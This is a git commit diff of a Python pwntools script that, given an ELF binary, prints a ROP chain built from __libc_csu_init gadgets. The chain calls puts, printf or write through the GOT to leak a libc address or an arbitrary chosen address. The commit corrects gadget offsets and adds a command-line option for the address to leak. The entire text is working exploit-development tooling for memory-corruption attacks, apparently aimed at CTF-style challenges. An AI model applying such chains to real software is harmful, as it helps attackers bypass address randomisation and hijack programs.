f8dfb3b4fbcdf55abd33a4d0ae4283fee9829279
Andrea Fioraldi <andreafioraldi@gmail.com>
2018-03-26 18:20:39 +0200

    corrected with got

--- leakyleak.py
+++ leakyleak.py
@@ -1,10 +1,22 @@
 from pwn import *
 import sys
 
+if len(sys.argv) < 2:
+    print "usage: python leakyleak.py <binary> [address_to_print]"
+    exit(1)
+
+to_leak = None
+if len(sys.argv) > 2:
+    try:
+        to_leak = int(sys.argv[2], 16)
+    except:
+        print "error: address to leak must be and exadecimal number"
+        exit(1)
+
 binary = ELF(sys.argv[1])
 
-gadget1 = binary.symbols["__libc_csu_init"] + (0x400530 - 0x40054A)
-gadget2 = binary.symbols["__libc_csu_init"] + (0x400530 - 0x4004F0)
+gadget1 = binary.symbols["__libc_csu_init"] + (0x4005EA - 0x400590)
+gadget2 = binary.symbols["__libc_csu_init"] + (0x4005D0 - 0x400590)
 
 if "puts" in binary.got:
     #r12 = puts@plt
@@ -14,10 +26,13 @@ if "puts" in binary.got:
     print "rop += p64(0x%x) # gadget 1" % gadget1
     print "rop += p64(0) # rbx"
     print "rop += p64(0) # rbp"
-    print "rop += p64(0x%x) # r12 [puts@plt]" % binary.symbols["puts"]
+    print "rop += p64(0x%x) # r12 [puts@got]" % binary.got["puts"]
     print "rop += p64(0) # r13"
     print "rop += p64(0) # r14"
-    print "rop += p64(0x%x) # r15 [puts@got]" % binary.got["puts"]
+    if to_leak == None:
+        print "rop += p64(0x%x) # r15 [puts@got]" % binary.got["puts"]
+    else:
+        print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
     print "rop += p64(0x%x) # gadget 2" % gadget2
 elif "printf" in binary.got:
     #r12 = printf@plt
@@ -27,7 +42,7 @@ elif "printf" in binary.got:
     print "rop += p64(0x%x) # gadget 1" % gadget1
     print "rop += p64(0) # rbx"
     print "rop += p64(0) # rbp"
-    print "rop += p64(0x%x) # r12 [printf@plt]" % binary.symbols["printf"]
+    print "rop += p64(0x%x) # r12 [printf@got]" % binary.got["printf"]
     print "rop += p64(0) # r13"
     print "rop += p64(0) # r14"
     print "rop += p64(0x%x) # r15 [printf@got]" % binary.got["printf"]
@@ -42,7 +57,7 @@ elif "write" in binary.got:
     print "rop += p64(0x%x) # gadget 1" % gadget1
     print "rop += p64(0) # rbx"
     print "rop += p64(0) # rbp"
-    print "rop += p64(0x%x) # r12 [write@plt]" % binary.symbols["write"]
+    print "rop += p64(0x%x) # r12 [write@got]" % binary.got["write"]
     print "rop += p64(8) # r13 [sizeof void*]"
     print "rop += p64(0x%x) # r14 [write@got]" % binary.got["write"]
     print "rop += p64(1) # r15 [stdout]"
